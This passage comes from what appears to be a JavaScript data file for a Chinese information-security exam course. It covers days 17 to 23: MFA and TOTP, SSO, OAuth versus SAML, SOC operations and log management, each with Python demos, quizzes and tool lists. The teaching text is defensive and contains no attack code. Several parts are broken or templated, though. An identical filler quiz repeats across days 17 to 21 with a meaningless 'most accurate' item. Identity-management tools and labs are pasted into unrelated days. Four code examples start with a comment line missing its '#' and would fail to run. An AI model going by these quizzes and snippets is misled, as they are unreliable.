    quiz: [{"id":"q17-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q17-2","question":"以下关于生物识别技术的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q17-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q17-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q17-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-18', day: 18, week: 3, title: '多因素认证（MFA）',
    objectives: ['理解MFA原理', '了解常见形式', '掌握实现方法'],
    content: '# 多因素认证（MFA）\n\n> 📋 **本节大纲**\u2003五大MFA形式(TOTP/HOTP/短信/推送/硬件密钥) | TOTP工作原理 | FIDO2优势\n\n## 概述\n\nMFA（Multi-Factor Authentication）是目前对抗密码泄露最有效的手段。即使你的密码完全泄露，缺少第二个认证因素（手机/令牌/指纹），攻击者也无法登录。MFA可阻止99%的账户盗用攻击。\n\n## 五大MFA形式\n\n**TOTP（基于时间的一次性密码）：**\nGoogle Authenticator、Microsoft Authenticator使用此标准（RFC 6238）。每30秒生成6位数字，基于共享密钥+当前时间计算。不需要网络连接，比短信更安全。\n\n**HOTP（基于计数器的一次性密码）：**\nRFC 4226标准，基于计数器而非时间。每次使用密码计数器+1。问题：如果用户误触生成多个密码而不用，计数不同步。\n\n**短信验证码：**\n最简单也最不安全——SIM卡可被克隆劫持（SIM Swap攻击）。NIST已不推荐短信作为独立MFA方式。但仍有广泛使用。\n\n**推送通知：**\n手机APP弹出"是否允许登录"的确认窗口，用户一键批准。体验最好，安全性依赖于手机锁定状态。\n\n**硬件安全密钥：**\nYubiKey、Titan Security Key等FIDO2/U2F设备。插入USB或NFC触碰即可认证。防钓鱼——密钥绑定到网站域名，不会向钓鱼网站响应。最高安全性级别。\n\n## TOTP工作原理详解\n\n1. 注册时服务器生成随机种子密钥（Secret）并Base32编码\n2. 用户扫描二维码将种子存入手机Authenticator\n3. 登录时：手机用"种子+当前时间戳/30秒"做HMAC-SHA1运算，取最后4字节转换为6位数字\n4. 服务器用相同种子+时间做相同计算，比对是否匹配\n5. 服务器通常允许±1个时间窗口（前后各30秒），防止时钟偏差\n\n## MFA安全考量\n\n- **种子密钥安全存储：**加密存储，泄露=所有TOTP可被伪造\n- **时间同步：**服务器和设备时间需NTP同步\n- **备用恢复码：**设备丢失时使用预先保存的恢复码\n- **防暴力：**TOTP只有6位数字（100万组合），需配合账户锁定\n\n## \n## 🔴 高频考点\n\n· TOTP基于时间(30秒一变)、HOTP基于计数器——区分这两个易混淆概念\n· **SIM Swap**是短信验证码最致命威胁——攻击者克隆SIM卡可接收验证码\n· FIDO2硬件密钥(YubiKey)是最强MFA方案——防钓鱼(密钥绑定网站域名)\n## 💜 记忆口诀\n\n· **TOTP vs HOTP**："T靠时间(Time/30秒)、H靠计数(HMAC/用一次+1)"\n· **安全排行**："短信最弱→APP推送→硬件密钥最强(FIDO2防钓鱼)"\n学习建议\n- TOTP基于时间、HOTP基于计数器——区分清楚\n- SIM Swap是短信验证码最致命的安全威胁\n- FIDO2硬件密钥是目前最强的MFA方案',
    codeExample: { language: 'python', code: 'import time\nimport hmac\nimport base64\nimport struct\n\ndef generate_totp(secret, interval=30):\n    timestamp = int(time.time() // interval)\n    time_bytes = struct.pack(">Q", timestamp)\n    secret_bytes = base64.b32decode(secret)\n    hmac_result = hmac.new(secret_bytes, time_bytes, "sha1").digest()\n    offset = hmac_result[-1] & 0x0f\n    code = struct.unpack(">I", hmac_result[offset:offset+4])[0] & 0x7fffffff\n    return f"{code % 1000000:06d}"\n\n# 测试\nsecret = "JBSWY3DPEHPK3PXP"  # Base32密钥\nprint(f"TOTP: {generate_totp(secret)}")\nprint("(30秒后会变化)")', description: '演示TOTP算法' },
    quiz: [{"id":"q18-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q18-2","question":"以下关于多因素认证（MFA）的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q18-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q18-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q18-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-19', day: 19, week: 3, title: '单点登录（SSO）',
    objectives: ['理解SSO概念', '了解SSO协议', '掌握实现原理'],
    content: '# 单点登录（SSO）\n\n> 📋 **本节大纲**\u2003SSO四大协议(SAML/OAuth/OIDC/CAS) | SSO优势与风险 | SAML流程详解 | 协议对比表\n\n## 概述\n\nSSO（Single Sign-On）让用户一次登录后，无需再次输入密码即可访问多个关联系统。比如你用微信登录各种第三方网站就是SSO的典型应用。但SSO是一把双刃剑——虽然方便，但认证中心一旦沦陷则所有系统皆失。\n\n## SSO核心优势\n\n- **用户体验：**一次登录，全天畅通。省去记忆几十个不同密码的痛苦\n- **密码安全性：**用户只需维护一个高强度密码，不再为每个网站重复使用弱密码\n- **统一管理：**管理员在认证中心一处禁用账户，所有系统立即失效（离职回收权限的关键）\n- **降低IT成本：**减少密码重置工单——据统计40%的IT帮助台电话是"忘记密码"\n\n## SSO核心风险与缓解\n\n- **单点故障：**认证中心宕机→所有依赖系统无法登录。缓解：IdP高可用部署（多节点+负载均衡）\n- **账户沦陷影响扩大：**一个密码泄露→攻击者可登录所有系统。缓解：MFA强制绑定\n- **实现复杂：**需要改造所有接入系统支持SSO协议。缓解：选择成熟方案（Keycloak/Auth0）\n\n## 四大SSO协议\n\n### SAML 2.0（安全断言标记语言）\n- 基于XML的企业级标准，支持复杂的联邦认证和属性传递\n- 工作流程：用户访问SP→SP重定向到IdP→用户登录→IdP签发XML断言→返回SP验证\n- 适用：跨组织SSO、传统企业应用\n\n### OAuth 2.0（开放授权）\n- 本质是授权框架而非认证协议，允许第三方应用获取用户资源的访问权限\n- 四种授权模式：授权码（最安全/Web应用）、隐式（SPA）、密码（信任应用）、客户端凭证（服务间）\n- 关键角色：用户(Resource Owner)、第三方应用(Client)、授权服务器、资源服务器\n\n### OpenID Connect (OIDC)\n- 在OAuth 2.0之上添加身份认证层，使用JWT格式的ID Token传递用户信息\n- 现代Web/移动端首选，比SAML更轻量\n\n### CAS（中央认证服务）\n- 开源SSO协议，教育机构广泛使用\n\n## SAML vs OAuth vs OIDC速记\n\n| 协议 | 定位 | 数据格式 | 典型场景 |\n|------|------|---------|---------|\n| SAML | 认证 | XML | 企业SSO |\n| OAuth | 授权 | JSON | API授权 |\n| OIDC | 认证(基于OAuth) | JWT | 现代Web/移动 |\n\n## \n## 🔴 高频考点\n\n· SSO最大挑战：**单点故障(认证中心宕机→全部系统无法登录)+账户联合风险(一密码泄露→全沦陷)**\n· SAML(认证/XML/企业)vs OAuth(授权/JSON/API)vs OIDC(认证+OAuth/JWT/现代)——三重对比必考\n· IdP(身份提供者)和SP(服务提供者)的角色区分\n## 💜 记忆口诀\n\n· **SAML-OAuth-OIDC**："SAML认证XML、OAuth授权JSON、OIDC加身份"\n· **IdP vs SP**："IdP说我证明他是谁、SP说我相信你"\n学习建议\n- SSO最大的安全挑战是"单点故障"和"账户联合风险"\n- SAML和OAuth的本质区别：SAML=认证，OAuth=授权\n- OIDC是OAuth之上的认证层——把OAuth的授权能力拓展到认证',
    codeExample: {
      language: 'python',
      code: ` SSO会话管理模拟\nclass SSOManager:\n    def __init__(self):\n        self.sessions = {}\n    \n    def login(self, username, password):\n        valid_users = {"admin": "admin123", "user": "user123"}\n        if username in valid_users and valid_users[username] == password:\n            session_id = f"session_{len(self.sessions)+1}"\n            self.sessions[session_id] = username\n            return session_id\n        return None\n    \n    def validate(self, session_id):\n        return session_id in self.sessions\n\nsso = SSOManager()\nsid = sso.login("admin", "admin123")\nprint(f"登录成功: {sid}")\nprint(f"验证状态: {sso.validate(sid)}")`,
      description: '演示SSO会话管理',
    },
    quiz: [{"id":"q19-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q19-2","question":"以下关于单点登录（SSO）的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q19-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q19-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q19-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-20', day: 20, week: 3, title: 'OAuth与SAML',
    objectives: ['理解OAuth和SAML区别', '了解OAuth流程', '掌握应用场景'],
    content: '# OAuth与SAML\n\n## OAuth 2.0\n\n### 概念\n- 授权框架（注意：不是认证协议）\n- 允许第三方应用访问用户资源\n- 不直接处理用户认证\n\n### 授权类型\n\n1. **授权码模式（Authorization Code）**\n   - 最安全，适用于Web应用\n   - 流程：用户授权→获取授权码→交换令牌\n\n2. **简化模式（Implicit）**\n   - 适用于SPA单页应用\n   - 直接返回访问令牌\n\n3. **密码模式（Password）**\n   - 适用于信任的应用\n   - 用户直接提供密码\n\n4. **客户端凭证模式（Client Credentials）**\n   - 应用间调用\n   - 不涉及用户\n\n### OAuth角色\n- **Resource Owner**：资源所有者（用户）\n- **Client**：客户端（第三方应用）\n- **Authorization Server**：授权服务器\n- **Resource Server**：资源服务器（API）\n\n## SAML 2.0\n\n### 概念\n- 安全断言标记语言\n- 基于XML的协议\n- 专注于身份认证和SSO\n\n### SAML组件\n- **Identity Provider (IdP)**：身份提供者\n- **Service Provider (SP)**：服务提供者\n- **Assertion**：断言（包含用户信息）\n\n### 适用场景\n- 企业级SSO\n- 跨组织认证\n- 安全要求高的场景\n\n## OAuth vs SAML对比\n\n| 特性 | OAuth 2.0 | SAML 2.0 |\n|------|-----------|----------|\n| 类型 | 授权框架 | 认证协议 |\n| 格式 | JSON | XML |\n| 复杂度 | 简单 | 复杂 |\n| 适用 | 互联网、移动 | 企业SSO |\n| 令牌 | JWT、随机字符串 | 断言(XML) |\n\n## OpenID Connect (OIDC)\n- 基于OAuth 2.0的认证层\n- 使用ID Token（JWT格式）\n- 现代应用首选',
    codeExample: {
      language: 'python',
      code: ` OAuth授权流程模拟\nclass OAuthServer:\n    def __init__(self):\n        self.clients = {"app1": {"secret": "secret123"}}\n        self.tokens = {}\n    \n    def get_code(self, client_id):\n        return f"code_{client_id}_{len(self.tokens)}"\n    \n    def exchange_token(self, code):\n        token = f"token_{len(self.tokens)+1}"\n        self.tokens[token] = True\n        return token\n    \n    def validate_token(self, token):\n        return token in self.tokens\n\noauth = OAuthServer()\ncode = oauth.get_code("app1")\ntoken = oauth.exchange_token(code)\nprint(f"授权码: {code}")\nprint(f"访问令牌: {token}")\nprint(f"令牌有效: {oauth.validate_token(token)}")`,
      description: '演示OAuth授权流程',
    },
    quiz: [{"id":"q20-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q20-2","question":"以下关于OAuth与SAML的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q20-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q20-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q20-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-21', day: 21, week: 3, title: '第三周总结与测验',
    objectives: ['回顾第三周知识点', '检验学习成果', '为第四周做准备'],
    content: '# 第三周学习总结\n\n## 本周学习内容\n\n### Day 15: 身份认证基础\n- 认证因素：知识、持有、生物\n- 单因素 vs 多因素\n\n### Day 16: 密码认证技术\n- 密码安全原则\n- 密码哈希存储\n- 盐值作用\n\n### Day 17: 生物识别技术\n- 生理特征 vs 行为特征\n- 优缺点分析\n\n### Day 18: 多因素认证MFA\n- TOTP/HOTP算法\n- 常见MFA形式\n\n### Day 19: 单点登录SSO\n- SSO概念和优缺点\n- SAML、OAuth、OIDC\n\n### Day 20: OAuth与SAML\n- OAuth授权框架\n- SAML认证协议\n- 对比和应用场景\n\n## 知识要点\n\n| 技术 | 核心概念 |\n|------|----------|\n| 密码存储 | 加盐哈希 |\n| TOTP | 30秒+HMAC-SHA1 |\n| SAML | XML/企业SSO |\n| OAuth | JSON/授权框架 |\n| OIDC | OAuth之上的认证层 |\n\n## 下周预告\n\n第四周将学习安全运营：\n- 安全运营中心(SOC)\n- 日志管理\n- 事件响应\n- 安全监控',
    quiz: [{"id":"q21-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q21-2","question":"以下关于第三周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q21-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q21-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q21-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  // ========== Week 4: 安全运营 ==========
  {
    id: 'day-22', day: 22, week: 4, title: '安全运营概述',
    objectives: ['理解安全运营概念', '了解SOC职能', '掌握运营流程'],
    content: '# 安全运营概述\n\n> 📋 **本节大纲**\u2003SOC六大职能 | SOC人员层级L1-L2-L3 | 安全运营五步循环 | 成熟度模型 | MTTD/MTTR\n\n## 概述\n\n安全运营（SecOps）不同于"建设安全"——建设安全是"盖房子"，运营安全是"住房子+巡逻+救火"。安全运营意味着7×24持续监控、发现异常、快速响应、不断改进。SOC是安全运营的实体组织载体。\n\n## SOC安全运营中心\n\nSOC像一个网络安全版的"110指挥中心"——大屏显示实时攻击态势，分析师轮班盯着告警，一旦发现异常立即响应。\n\n### SOC六大核心职能\n1. **实时监控：**7×24不间断收集和分析安全设备（防火墙/IDS/WAF/EDR）的日志和告警\n2. **威胁检测：**从海量告警中识别真正的攻击，区分"真攻击"和"误报"\n3. **事件响应：**发现攻击后按PDCERF流程快速遏制、根除、恢复\n4. **威胁情报：**收集内外部威胁情报（APT组织TTP、最新漏洞利用代码），指导防御\n5. **漏洞管理：**跟踪新漏洞公告，评估影响范围，推动修复\n6. **合规报告：**为等保测评、ISO 27001审计提供安全运营证据\n\n### SOC人员层级（L1→L2→L3）\n- **L1分析师（初级）：**盯着SIEM告警屏幕，初步判断告警是真还是误报。约70%的告警在L1层处理完毕\n- **L2分析师（中级）：**调查L1升级的复杂告警，综合分析多源数据，确定攻击范围和影响\n- **L3专家（高级）：**主动"威胁狩猎"——不等告警，主动在日志中寻找攻击者潜伏的痕迹。还负责开发新的检测规则\n\n### 安全运营五步循环\n**监控**（收集日志）→ **检测**（分析告警）→ **响应**（遏制根除）→ **报告**（事件复盘）→ **改进**（优化规则）→ 回到监控。永远在循环，永远在改进。\n\n### 安全运营成熟度模型\n| 级别 | 特征 |\n|------|------|\n| 初始级 | 无正式流程，出了事再找人 |\n| 可重复级 | 有基本工具（SIEM），有标准流程 |\n| 已定义级 | 完善流程文档+定期培训+演练 |\n| 可管理级 | KPI驱动（MTTD平均检测时间、MTTR平均响应时间）|\n| 持续优化级 | 自动化(SOAR)+AI辅助+持续改进 |\n\n### 核心KPI指标\n- **MTTD（Mean Time to Detect）：**从攻击发生到被发现的平均时间。越短越好\n- **MTTR（Mean Time to Respond）：**从发现到处置完成的平均时间。越短越好\n- **告警准确率：**真阳性告警/总告警数。SOC的"生产力"指标\n\n## \n## 🔴 高频考点\n\n· SOC的L1/L2/L3分析师职责——L1初筛(70%告警)、L2深入调查、L3主动威胁狩猎\n· 评估SOC效能的两大KPI：**MTTD(平均检测时间)和MTTR(平均响应时间)**\n· 安全运营成熟度五级：初始→可重复→已定义→可管理→持续优化\n## 💜 记忆口诀\n\n· **L1-L3**："L1看屏初筛、L2深入调查、L3主动猎"\n· **双指标**："MTTD多久发现(Detection)、MTTR多久解决(Response)"\n学习建议\n- SOC L1/L2/L3的职责划分是CISP考试常见考点\n- MTTD和MTTR是评估SOC效能的核心指标\n- 安全运营是"持续"的——不是一次性的',
    codeExample: {
      language: 'python',
      code: ` 安全事件分类\ndef classify_event(severity, type):\n    levels = {1: "低", 2: "中", 3: "高", 4: "严重"}\n    event_types = {\n        "malware": "恶意软件",\n        "phishing": "钓鱼攻击",\n        "intrusion": "入侵尝试",\n        "data_leak": "数据泄露"\n    }\n    return levels.get(severity, "未知"), event_types.get(type, "其他")\n\n# 模拟事件\nevents = [\n    (3, "phishing"),\n    (4, "data_leak"),\n    (2, "intrusion"),\n]\nfor sev, typ in events:\n    level, name = classify_event(sev, typ)\n    print(f"事件: {name} | 级别: {level}")`,
      description: '演示安全事件分类',
    },
    quiz: [{"id":"q22-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q22-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q22-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q22-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q22-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-23', day: 23, week: 4, title: '日志管理',
    objectives: ['理解日志重要性', '了解日志类型', '掌握日志分析方法'],
    content: '# 日志管理\n\n> 📋 **本节大纲**\u2003四大类日志 | 集中日志方案(ELK/Splunk) | 分析方法(基线/关联/时间线) | 留存要求\n\n## 概述\n\n日志是安全运营的"黑匣子"——攻击者的每一个动作都会在系统中留下痕迹。没有日志，安全事件就成了无头悬案；有了高质量的日志，攻击的全过程可被还原。CISP考试重点考查日志类型、集中收集方案和留存要求。\n\n## 日志的核心价值\n- **事件检测：**从日志中发现异常——多次登录失败=可能暴力破解\n- **事件调查：**安全事件发生后的溯源取证——攻击者何时进入、做了什么、拿了什么\n- **合规审计：**法律法规（网络安全法/等保/GDPR）要求保留日志\n- **故障诊断：**系统和应用问题的排查依据\n\n## 四大类日志\n\n**系统日志：**Windows Event Log（4624登录成功/4625登录失败/4672特权分配）、Linux syslog（/var/log/auth.log认证日志）\n\n**安全日志：**防火墙（拒绝的流量记录）、IDS/IPS（攻击签名匹配）、VPN（连接/断开记录）、EDR（进程创建/网络连接）\n\n**应用日志：**Web服务器（Apache/Nginx access日志含URL/状态码/User-Agent）、数据库（慢查询/错误日志）、自定义应用日志\n\n**网络日志：**DNS查询、DHCP租约（IP→MAC对应关系）、NetFlow流量元数据\n\n## 日志集中管理：Syslog → SIEM\n\n**Syslog协议：**标准的日志传输协议。Facility（日志来源类别）×Severity（严重级别0紧急~7调试）= 分类传输\n\n**ELK Stack：**Elasticsearch（全文搜索）+Logstash（收集范式化）+Kibana（可视化）——开源黄金组合\n\n**Splunk：**商业SIEM平台，强大搜索语言SPL，但价格高昂\n\n## 日志分析法\n- **基线分析：**统计正常时段的访问量、错误率、流量模式→偏离基线即告警\n- **关联分析：**"账号A在3分钟内从3个不同国家IP登录"——单条日志看似正常，关联后暴露异常\n- **时间线还原：**将攻击链按时间排序——"22:00端口扫描→22:05 SSH暴力破解→22:30成功登录→23:00数据外传"\n\n## 日志留存与安全\n- **留存要求：**网络安全法≥6个月、等保三级≥6个月、PCI DSS至少1年\n- **日志安全：**独立日志服务器(管理员不能删除)、WORM存储(一次写入多次读取)、加密传输(TLS)和存储、访问控制(安全审计员专属)\n\n## \n## 🔴 高频考点\n\n· Windows安全事件ID：**4624=登录成功、4625=登录失败**——两个号必须记住\n· 日志留存要求：网络安全法≥6个月、等保三级≥6个月、PCI DSS至少1年\n· **日志不可篡改**是底线——WORM存储+独立日志服务器+加密传输\n## 💜 记忆口诀\n\n· **事件ID**："4624进(登录成功)、4625拒(登录失败)、4672特权"\n· **三重防线**："不可篡改(WORM)、加密传输(TLS)、访问控制(审计员专属)"\n学习建议\n- Windows登录事件ID是最实用的日志分析入门点：4624(成功)/4625(失败)\n- ELK Stack是安全运营的基础设施\n- "日志不可篡改"是日志安全的底线',
    codeExample: {
      language: 'python',
      code: ` 日志分析示例\nimport re\nfrom collections import Counter\n\ndef analyze_access_log(log_lines):\n    ips = []\n    status_codes = []\n    for line in log_lines:\n        # 简单解析Apache日志\n        match = re.match(r"(\\S+).*\\s(\\d{3})\\s\\d+", line)\n        if match:\n            ips.append(match.group(1))\n            status_codes.append(int(match.group(2)))\n    \n    # 统计\n    ip_counts = Counter(ips).most_common(5)\n    status_counts = Counter(status_codes)\n    return ip_counts, status_counts\n\n# 模拟日志\nlogs = [\n    "192.168.1.1 - - GET /page HTTP/1.1 200 1234",\n    "192.168.1.1 - - GET /admin HTTP/1.1 401 123",\n    "192.168.1.2 - - GET /page HTTP/1.1 200 1234",\n    "192.168.1.1 - - GET /admin HTTP/1.1 401 123",\n]\nips, statuses = analyze_access_log(logs)\nprint(f"TOP IP: {ips}")\nprint(f"状态码: {dict(statuses)}")`,
      description: '演示日志分析',
    },
    quiz: [{"id":"q23-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q23-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q23-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q23-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q23-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
